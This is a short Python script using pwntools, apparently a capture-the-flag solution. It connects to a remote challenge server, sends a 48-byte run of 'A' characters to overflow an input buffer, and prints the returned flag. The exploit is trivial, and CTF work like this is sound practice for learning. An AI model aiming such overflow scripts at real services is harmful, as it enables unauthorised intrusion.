from pwn import *

elf = ELF("./client")

# io = elf.process()
io = remote("sisterlab.id", 42000)

size = 48 # silahkan cari tahu sendiri

io.sendlineafter(b'> ', b'A' * size)

io.recvuntil(b'flag: ')

flag = io.recvline()

print(f'flag: {flag}')

